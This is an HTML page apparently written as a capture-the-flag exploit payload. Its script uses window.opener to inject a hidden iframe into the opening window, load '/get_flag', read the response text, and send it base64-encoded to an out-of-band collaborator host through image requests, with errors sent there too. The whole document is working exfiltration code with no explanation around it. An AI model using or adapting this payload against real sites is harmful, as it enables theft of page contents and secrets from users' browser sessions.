<!DOCTYPE html>
<html>
<body>
<script>
  if (window.opener) {
    // Inject an iframe into the original window
    const iframe = window.opener.document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = '/get_flag';  // same-origin request

    iframe.onload = () => {
      try {
        const flag = iframe.contentDocument.body.innerText;
        new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag);
      } catch (e) {
        new Image().src = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?err=' + btoa(e.message);
      }
    };

    window.opener.document.body.appendChild(iframe);
  }
</script>
</body>
</html>
